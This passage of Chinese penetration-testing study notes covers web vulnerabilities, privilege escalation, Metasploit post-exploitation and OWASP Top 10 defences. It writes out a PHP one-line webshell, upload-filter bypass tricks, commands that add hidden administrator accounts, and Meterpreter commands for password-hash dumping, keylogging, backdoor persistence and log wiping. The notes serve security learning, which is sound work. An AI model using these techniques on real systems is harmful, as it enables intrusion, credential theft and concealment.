什么是文件上传：如果web应用在文件上传过程中没有对文件的安全性进行有效的校验，攻击者就可以通过上传webshell等等恶意文件进行对服务器进行攻击 上传文件的时候，如果服务器的脚本语言没有对文件进行严格的过滤和验证，就可能导致上传恶意的脚本文件，从而控制整个网站，甚至是服务器 2.危害​ 网站被控制，对文件的增删查改，执行命令，链接数据库 ​ 如果服务器长时间没有更新的话，就可以尝试提权，导致服务器沦陷 ​ 同服务器的其他网站沦陷 3.文件上传漏洞的前提 有文件上传的功能 且上传到的目录，能够解析脚本语言，否则405 能够访问上传的文件 4.什么情况下会导致文件上传漏洞 本地文件上传被限制：前端js验证 服务端过滤不严格导致被绕过：MIME类型检测绕过，扩展名检测绕过，文件内容绕过，文件解析漏洞导致文件执行（iiis，apache，ngnix） 服务端目录路径检测绕过（文件路径截断（0x00）） 服务器配置不当（iis6.0 put直接写文件） 开源编辑器上传漏洞：fckeditor自定义文件名，文件夹结合iis6.0解析漏洞，杀伤力非常强 ​ ewebeditor：可登录后台，配置允许上传类型.asp 5.文件上传限制手段和绕过手段 以及过滤不严被绕过，绕过黑名单​ 绕过js检测：客户端使用js对上传的文件进行限制，不允许上传php结尾的文件，通过修改burp拦截服务器响应包的信息，修改限制条件，让.php为后缀的文件才能够顺利上传 MIME类型检测： 过滤不严导致被绕过：有一些网站使用了黑名单过滤掉了一些关键的可执行的脚本的后缀，但是黑名单不全或者被绕过，比如服务端过滤掉了后缀为.php的文件，但是没有过滤掉php3的其他可以执行的脚本文件后缀，攻击者就可以上传其他的可执行的脚本文件的后缀到服务器上 绕过黑名单检测:一般有个专门的blacklist文件,里面包含有常见的危险脚本文件扩展名,如:php,asp,aspx; 使用大小写绕过：由于windows对大小写不敏感，php改为Php 黑名单绕过（php,php2,php3,php5,phtml,asp,aspx,ascx,cer,asa,jsp,jspx…..） 特殊文件名绕过（后缀加. 或者空格）：如.php改为.php. 或者.php 0x00截断：文件名后缀就一个%00字节，可以截断某些函数对文件名的判断，认为是一个终止符：比如.php.jpg,burp抓包16进制模式php后面添加00； .htaccess文件攻击：通过move_uploaded_file函数 把自己写的.htaccess文件覆盖掉服务器上就可以解析定义名单了 解析绕过： apache解析漏洞：一个文件名为test. php. aaa. bbb. ccc的文件，Apache会从ccc的位置往 php的位置开始尝试解析, 如果ccc不属于Apache能解析的后缀名，那么 Apache就会尝试去解析bbb,这样一直往前尝试，直到遇到 一个能解析的扩展名为止 iis解析漏洞 iis6.0 iis7.0,7.5 3. nginx解析漏洞 其他绕过： 某些情况下管理员错误的服务器配置会导致.html ; .xml等静态页面 后缀的文件也可被执行。 多文件上传时，有时服务器只对第一个上传的文件进行了检查，这 时通过上传多个文件并将 恶意文件掺杂进其中也可绕过服务器的过 滤 6.文件上传的保护预防：​ 1.上传文件的存储目录不给执行权限 ​ 2.隐藏上传文件访问路径 ​ 3.文件后缀白名单，注意0x00截断攻击(PHP更新到最新版本) ​ 4.不能有本地文件包含漏洞(include dama. jpg) ​ 5.及时更新web应用软件避免解析漏洞攻击 7.webshell​ 常见的文件上传方法就是上传网站木马，webshell就是网站木马文件，根据开发者使用的语言不同，分为asp木马，php木马，jsp木马等等，该类木马利用了脚本语言中的系统命令执行，文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，**攻击者就可以实现对服务器的控制 一句话木马： &lt;?php eval($_POST['v']);?&gt; ​ eval函数 将传入的内容作为php脚本执行 ​ $_POST[‘v’]传入想要执行的代码 ​ V是传递数据的参数，只有使用正确的参数名提交代码才能够执行，因此也称为一句话木马的密码 一句话木马利用的思路：手动构造数据包利用 ​ 自动化工具使用 XSS1.XSS原理​ 跨站脚本攻击，恶意攻击者往web页面插入恶意的js代码，当用户浏览器浏览该页面的时候，嵌入到里面的web的js会被执行，从而达到恶意攻击用户，xss是一种发生在前端的漏洞，所以受害对象主要是前端用户， XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后， 在输到前端时被浏览器当作有效代码解析执行从而产生危害。 2.XSS危害，攻击手段以及攻击流程危害： 对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。但 是在各类的社交平台，邮件系统，开源流行的Web应用，BBS,微博等 场景中， 造成的杀伤力却十分强大。 •攻击手段：XSS漏洞可以用来进行钓鱼攻击、获取键盘记录、用户cookie获取等。甚至 可以结合浏览器自身的漏洞对用户主机进行远程控制等 攻击流程： 3.XSS注入思路 4.XSS防范 5.绕过 大小写，双写绕过 编码绕过：URL编码，html实体编码，js编码，base编码 6.XSS分类： 反射型：：xss代码出现出现在url参数或者请求中，浏览器发出请求的时候，参数值作为输入提交到服务器，服务器接受处理后参数值出现在响应的html中，最后浏览器解析执行了这段xss代码 存储型xss：xss下攻击者可以将脚本注入后台存储起来，构成持久性的危害 DOM型: dom:通过 JavaScript，可以重构整个 HTML 文档。您 可以添加、移除、改变或重排页面上的项目。 要改变页面的某个东西，JavaScript 就需要获得 对HTML 文档中所有元素进行访问的入口。这个 入口，连同对 HTML 元素进行添加、移动、改变 或移除的方法和属性，都是通过文档对象模型来 获得的（DOM）。 所以，你可以把DOM理解为一个一个访问HTML 的标准编程接口 DOM应用–对标签进行操作,用构造javascript恶意语句就可以修改 HTML的DOM结构中的某个值，从而触发跨站脚本攻击 DOM XSS与反射型XSS和存储型XSS的差别是在于DOM XSS的代码不 需要服务器解析响应的直接参与，触发XSS靠的是浏览器DOM解析器 的解析，可以完全认为是客户端的事情。 简单的DOM型的XSS—直接获取输入内容 另外一种DOM型XSS—通过URL获取输入内容 7.反射型xss get和postget： post： CSRF1.原理csrf是一种挟制用户在当前已登录的web应用程序上执行非本意的操作的攻击方法，在csrf的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接）然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了 简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的，攻击者盗用了你在网站的身份，以你的名义发送恶意请求，比如：以你的名义发邮件，发消息，修改个人信息，修改密码，财产操作或者是购买一些商品 2.csrf和xss的区别CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS 是直接盗取到了用户的权限，然后实施破坏 3.csrf前提• CSRF利用的前提条件 • 从图中可以看到，要完成一次CSRF攻击，受害者必须一次完成两个步骤: • 1.登录信任网站A,并在本地生成Cookieo。 • 2.在不退出的情况下，访问危险网站B。 • 如果不满足以上两个条件中的一个，就不会受到CSRF的攻击 4.漏洞测试流程 5.防范措施 ​ token防范的原因：由于csrf他的主要原因是敏感操作的链接容易被伪造，token验证主要就是防止这个链接被伪造，每次请求的时候，都会增加一个随机码，后台每次对这个随机码进行验证 常见的业务逻辑漏洞1.有哪些常见的业务逻辑漏洞 1.弱口令漏洞 2.暴力破解 3.客户端验证 4.任意密码充值 5.越权访问： 6.交易漏洞 7.短信炸弹许多网站目前都提供短信接口，其中最常见的就是下发短信验证，如果此类功能没有进行限制则容易被攻击者利用向指定的手机发送大量的短信，既浪费资源又影响手机用户 2.常见业务逻辑漏洞基本挖掘思路 1.暴力破解漏洞挖掘 2.绕过验证漏洞挖掘 3.越权访问漏洞挖掘 4.交易篡改漏洞挖掘 3.业务功能模块与业务逻辑漏洞1.账户管理类 2.电子商务类 3.业务服务类 文件包含原理以及漏洞成因程序员开发人员一般会将重复的使用的函数写到单个文件中，需要使用的时候直接调用，这种文件调用的过程就是文件包含 常见的文件包含函数 文件包含分类本地文件包含： 远程文件包含 文件包含的利用 条件利用文件包含需要满足两个基本条件：1.include（）等函数通过动态变量的方式引入需要包含的文件 2.用户能够控制该动态变量 利用lfi利用 rfi利用 伪协议file://伪协议data:// 和 php://inputphp://filter本地文件漏洞挖掘 本地文件包含预防 任意文件查看与下载1.原理&amp;危害&amp;分类：一些网站的业务需求，可能会提供文件查看或者下载的功能，如果对用户的查看或下载的文件不进行限制，就可以查看或者下载文件，可以是源代码，敏感文件等等各种敏感信息 用户控制文件名输入 $filename=$_GET['filename']; $filename没有经过校验，或者校验不合格，用户可以控制这个变量下载任意 的文件，比如/etc/passwd、./index.php等等。这样就造成了任意文件下载 漏洞。 危害：下载服务器任意文件，包含脚本代码文件，系统敏感文件，可以配合其他类型的漏洞，进一步进行代码审计，查找更多可以利用的代码 分类：任意文件读取 &lt;?php //读取test.txt文件 $filename=\"test.txt\"; //第一种 readfile($filename); //第二种 echo file_get_contents($filename); //第三种 $fiiename=\"test.txt\"； $fp=fopen($filename,\"r\")or die(\"Unable to open fiile!\"); $data = fread($fp,1024); fclose($fp); echo $data; ?&gt; $filename=$_GET[f]; 当读取的文件是以传参的形式输入那么用户就可控 $filename没有经过校验，或者校验不合格，用户可以控制这个变量读 取任 意的文件，比如/etc/passwd、./index.php等等。这洋就造成了任 意文件读取 漏洞 ​ 任意文件下载 两种文件下载方式: 直接下载:常见是直接在URL地址后面跟着文件压缩包 &lt;a href=\"http://www.a.com/ccc.rar\"&gt;下载&lt;/a&gt; 这种方式无漏洞 附件下载: &lt;?php if (empty($_GET['filename'])){ exit();} $filename = $_GET['filename']; //以二进制方式下载,保证内容不出错 header('Content-Type:application/octet-stream'); //获取文件大小 header(\"Accept-Length:\".filesize($filename)); //以附件的方式下载 需要结合读文件才能下载readfile($filename); header('Content-Disposition:attachment;filename='.$filename); readfile($filename);?&gt; 2.漏洞成因 3.漏洞挖掘1、Web漏洞扫描器(awvs, appscan, nessus) ； 2、手动挖掘从连接和参数名查看； 4.漏洞修复 SSRF原理服务器端请求伪造，SSRF是一种由攻击者构造形成的由服务端发起请求的一个安全漏洞，一般情况下，ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是由于内部服务端发起的，所以他能够请求到与他相连而与外网隔离的内部系统） SSRF是由于服务端获取其他服务器的相关信息的功能 中形成的 漏洞成因由于很多网站都提供了从其他的服务器上面获取数据的一些功能，使用用户指定的url，网站可以获取图片，下载地址，读取文件内容等等，如果没有对目标地址做过滤或者是一些限制，这个功能被恶意使用，就可以利用存在缺陷的web应用程序作为代理攻击远程和本地服务器 SSRF危害 SSRF漏洞挖掘 通用的ssrf实例以及绕过Weblogic(wbe中间件)配置不当，天生ssrf漏洞 Discuz x2.5/x3.0/x3.1/x3.2(论坛软件系统) ssrf漏洞 绕过：1.IP地址转换成十进制:127.0.0.1=2130706433 ping 2130706433 2. ssrf防范 任意代码执行漏洞1.原理在web应用中有时候程序员为了灵活性，简洁性，会在代码中利用eval函数等等去处理，比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑到用户能够控制整个字符串，将会造成代码执行漏洞 2.危害1.执行任意代码 2.向网站写Webshell 3.控制整个网站甚至是服务器 3.利用及其函数 4.防御 命令执行漏洞1.原理一般出现这种漏洞，是因为系统从设计需要 给用户提供指定的远程命令操作的接口，比如常见的路由器，防火墙，入侵检测等设备的web管理界面上面，提交后，后台会对ip地址进行一次ping测试，并且返回测试结果，如果设计者在完成该功能时候，没有进行严格的安全控制，就会导致攻击者通过该接口提交一些意想不到的命令，从而让后台进行执行，控制整个后台服务器 2.成因：应用在调用这些函数执行命令的时候，如果将用户输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入情况下，就会造成命令执行漏洞 3.危害 4.命令执行漏洞利用1.相关函数 2.系统命令 3.system（）函数利用 4.如果有写权限的话1.反弹shell，尝试提权 2.linux系统执行pwd得到绝对路径，写一句话木马 3.windows系统下执行chdir得到绝对路径，写一句话木马 5.防范 XXE漏洞1.原理 一个xml文件包括：文档声明，元素，属性，注释，cdata，特殊字符，处理指令 2.攻击思路 3.blind xxe 4.xxe防御 php反序列化1.原理序列化是将程序之间的对象 转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序 列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别 为serialize()和unserialize()。 反序列化本身并不危险,但是如果反序列化时,传入反序列化函数的参数可以被用 户控制那将会是一件非常危险的事情。利用参数输入恶意的字符串值，造成漏洞。 不安全的反序列化造成的危害只有你想不到,没有他做不到 serialize和unserialize就是用来解决这一问题的。 serialize：可以将变量转换为字符串并且在转换中可以保存当前变量的值； unserialize：则可以将serialize生成的字符串变换回变量 2.魔术方法magic function魔术方法我们着重关注一下几个： __construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用 的。 __destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销 毁时执行，当对象被销毁时会自动调用。 __wakeup()：进行unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法,可以进行初始化对象。 __toString()：用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时 就会调用。 __sleep()：当一个对象被序列化的时候被调用,可以设定需要保存的成员属性 3.防御和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最 好的预防措施: 1.不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。 2.在进入反序列化函数之前,对参数进行限制过滤 windows服务器提权1.提权方式操作系统漏洞提权 提权方式:操作系统漏洞提权 根据没有修补的补丁号码，到网上找利用程序，进行利用 。 1 . 访问目标网站 2 . 拿到webshell：通过文件上传，SQL注入，代码执行等等 3 . 上传自己的cmd.exe(因为默认一般不让调用系统的cmd.exe) 4 . 查看服务器信息(网络信息 , 账号信息 , systeminfo系统详细信息 等等) 5 . 利用提权补丁对比工具,查看可以利用的poc(漏洞测试代码程序) 6 . 上传可用的提权程序进行提权 7.比如上传pr.exe，接下来查看并且测试默认权限是什么，可以干什么，利用pr.exe进行提权，注意后面执行的命令使用双引号包裹 8.利用pr.exe提权成功，添加net user 用户名 密码 /add 9.也可以添加隐藏用户 ： net user 用户名$ 密码 /add 10.把用户添加到管理员组 net localgroup administrator 用户名 /add 11.查看当前的系统开启的端口情况：netstat -anp tcp 13.上传一个开3389端口的exp，进行开启 14. 此时虽然端口已经打开,账号也已经 创建完成 , 但是不能直接远程登录,因为我们的物理机跟 web服务器是不能直接通信的,所以要进行端口数据转发 15。端口转发, 网络拓扑解析 , 现在要实现 从2003 server 端口3389传输的数据,使得能在hack web server 上能进行监听 第三方服务提权 FTP，mysql，mssql提权 首先要找到目标服务器上的第三方服务: 方式: 1 . 看进程tasklist 2 . 看端口 netstat -ano 3 . 看文件 linux提权• 1.获取操作系统版本号 • 2.搜索exp • 3.反弹shell • 4.尝试利用 获取发行版本 • cat /etc/issue • cat /etc/*-release • cat /etc/lsb-release •获取内核版本 • cat /proc/version • uname -a • uname -mrs • rpm -q kernel • dmesg | grep Linux • ls /boot 安全漏洞检测与利用1.漏洞信息的组成 漏洞名称，发布日期，漏洞编号，风险等级，影响范围，漏洞描述，解决方案 2.常见的系统漏洞扫描器软件类：Nmap，NESSUS，openvas 硬件类：绿盟的远程安全评估系统，迪普风险管理系统 3.漏洞扫描基本流程存活判断-》端口扫描-》服务识别-》系统识别-》弱口令/登录扫描-》漏洞映射 4.漏洞识别原理 5.Nmap扫描漏洞 6.NESSUS:是目前全世界用的人最多的一个系统漏洞扫描与分析软件，具有能够提供完整的电脑漏洞扫描服务，并且随时更新漏洞数据库，可同时在本机或者远端上遥控，并且进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整 7.Metasploit介绍与漏洞利用metasploit是一个漏洞利用框架，简称msf，允许开发者开发自己的漏洞脚本从而进行测试，是一个很强大的渗透测试框架 metasploit重要模块 metasploit常用命令 metasploit攻击思路及其流程 metasploit进行ms17_010漏洞利用 metasploit用ms17_010漏洞–远程监控 metasploit扩展模块-meterpreter meterpreter常用命令1.background： 返回，把meterpreter后台挂起 2.session ： 查看已经成功获取的会话 3.shell：获取目标主机的远程命令行shell，如果出错，考虑是目标主机限制了cmd.exe的访问权 4.cat：查看目标主机上的文档内容 5.getwd：获取系统工作的当前目录 6.upload： 上传文件到目标主机 7.download：把目标主机上的文件下载到我们的攻击主机上 8.edit：调用vi编辑器，对目标主机的文件进行修改 9.search ： 在目标主机文件系统上搜索文件 10.portfwd： 端口转发 11.route：显示目标主机上的主机路由表 12.getuid： 查看meterpreter注入到目标主机的进程的所属用户 13.sysinfo： 查看目标主机的系统信息 14.ps：查看目标主机上运行的进程信息，结合migrate使用 15 migrate： 将meterpreter会话移植到另一个进程 16. execute： 在目标主机上运行某个程序 17.getpid: 获取meterpreter会话在目标主机上注入进程的进程号 18.shutdown：关闭目标主机 19.后渗透模块：post/windows/gater/forensics/enum_drives调用 可以获取目标主机的存储器信息 20.调用post/windows/gather/checkvm后渗透模块，确定目标主机是否是一天虚拟机 run post/windows/gather/checkvm 21.persistence后渗透模块向目标主机植入后门程序 22.调用getgui后渗透攻击模块：作用：开启目标主机远程桌面，并且可以添加管理员组账号 23.提权命令getsystem:使用getsystem提升当前进程执行账户为system用户，拿到系统最高权限 24.键盘记录器功能：命令：run post/windows/capture/keylog_recorder 25.系统账号密码获取： 命令： run post/windows/gather/hashdump 在获取system权限的情况下，使用hashdump命令可以到处目标主机的sam文件，获取目标主机的账号密码hash信息，剩下的就可以用爆破软件算出明文密码 26.调用post/windows/gather/enum_applications模块获取目标主机上的软件安装信息 命令：run post/windows/gather/enum_applications 27.调用post/windows/gather/dumplinks获取目标主机上最近访问过的文档、链接信息 命令：run post/windows/gather/dumplinks 28.调用post/windows/gather/enum_ie后渗透模块，读取目标主机IE浏览器cookies等缓 存信息，嗅探目标主机登录过的各类账号密码 命令：run post/windows/gather/enum_ie 29.clearv 入侵痕迹擦除 windows系统安全加固安全基线 漏洞修复：补丁安装，端口封禁（在组策略里面创建ip安全策略） 安全加固账号口令：账号优化，目的是为了树立系统中的账号以及口令，避免默认账号以及弱口令的存在，删除无用账号，锁定、禁用无用账号 ​ 口令策略：增强密码复杂度，防止用户长期使用同一个密码，以及账号锁定策略等等，降低系统账号被暴力破解的可能性 授权管理： 授权账号登陆：目的是设置允许从本地或者远程登陆的账号。 •配置操作：开始运行secpol.msc安全设置本地策略用户权限分配 owasp1.woasp top10 1.注入：将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。 防止 防止注入漏洞需要将数据与命令语句、查询语句分隔开来。 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。 注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。 注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。 2.失效身份认证通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。 不要使用发送或部署默认的凭证，特别是管理员用户。 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的记住秘密，或其他现代的基于证据的密码策略相一致。 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。 3.敏感信息泄露许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。 对一些需要加密的敏感数据，应该起码做到以下几点： 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。 确保存储的所有敏感数据被加密。 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。 确保传输过程中的数据被加密，如：使用TLC。确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。 禁止缓存对包含敏感数据的响应。 确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。 单独验证每个安全配置项的有效性。 4.xxe 许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。 开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺陷还需要： 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。 参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。 尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（ WAF ）来检测、监控和防止XXE攻 5.失效的访问控制未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。 访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。 - 除公有资源外，默认情况下拒绝访问。 - 使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。 - 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。 - 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。 - 禁用 Web服务器目录列表，并确保文件元数据（如：git）不存在于 Web的根目录中。 - 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。 - 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。 - 当用户注销后，服务器上的JWT令牌应失效。 开发人员和 QA人员应包括功能访问控制单元和集成测试人员 6.安全配置错误安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。 应实施安全的安装过程，包括： 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9：2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。 向客户端发送安全指令，如：安全标头。 在所有环境中能够进行正确安全配置和设置的自动化过程 7.跨站脚本xss 当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点 防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以通过如下步骤实现： 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》。 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。 8.不安全的反序列化不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击 唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。如果上述不可能的话，考虑使用下述方法： 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。 在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。 如果可能，隔离运行那些在低特权环境中反序列化的代码。 记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。 监控反序列化，当用户持续进行反序列化时，对用户进行警告。 9.使用含有已知漏洞的组件组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响 应该制定一个补丁管理流程： 移除不使用的依赖、不需要的功能、组件、文件和文档。 利用如 versions、DependencyCheck 、retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置 10.不足的日志记录和监控不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测 根据应用程序存储或处理的数据的风险：: 确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。 确保日志以一种能被集中日志管理解决方案使用的形式生成 确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。 建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。 建立或采取一个应急响应机制和恢复计划，例如：NIST 800-61 rev 2或更新版本。 目前已有商业的和开源的应用程序防护框架（例如：OWASP AppSensor）、Web应用防火墙（例如 ：Modsecurity with theOWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。 web漏洞扫描与渗透测试1.漏洞验证基本流程 2.读懂漏洞扫描报告 3.漏洞记录编写 4.web应用渗透基本思路 1.渗透测试基础案例 渗透文章管理系统cms 该网站是一个小型的文章管理系统，开发技术为php+mysql 漏洞扫描，使用avws扫描 分析扫描报告得到该网站的漏洞，比如存在sql漏洞 然后针对于相应的漏洞进行利用，比如，sqlmap获取到网站后台登录账号密码 网站后台登录，寻找文件上传点，一般上传点位于文章的编辑器，头像等，媒体文件上传处 如后台管理处有漏洞，直接使用一句话木马 确认webshell文件路径后，用一句话木马链接菜刀，拿到webshell权限 AWVS自动化的web漏洞扫描器，审查漏洞如sql注入，xss等其他能够被黑客利用存在的漏洞的网页应用 APPSCAN安全扫描工具，具有利用爬虫技术进行网站安全渗透测试的能力 Nmap namp六种状态 map对端口进行扫描中，当nmap向目标主机发送报文并根据返回报文从而 认定端口的6种状态的含义（注意：这六种状态只是namp认为的端口状态，例如 ：有些主机或者防火墙会返回一些不可靠的报文从而妨碍nmap对端口开放问题的 确认）。 Open：端口处于开放状态，例如：当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时， 我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们 就认为此端口开放了并且使用了TCP服务。 Closed：端口处于关闭状态。例如：TCP SYN类型的扫描，如果返回RST类型的报文，则端口处 于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端 口，而且，只是在我们扫描的这个时刻为关闭，当我们在另一个时间段进行扫描的时候，这些关闭 的端口可能会处于open的状态。 Filtered（过滤的）：由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要 是由于网络或者主机安装了一些防火墙所导致的。当nmap收到icmp报文主机不可达报文（例如： type为3，code为13（communication administratively prohibit）报文）或者目标主机无应答 ，常常会将目标主机的状态设置为filtered。 Unfiltered（未被过滤的) : 当nmap不能确定端口是否开放的时候所打上的状态，这种状态和 filtered的区别在于：unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的 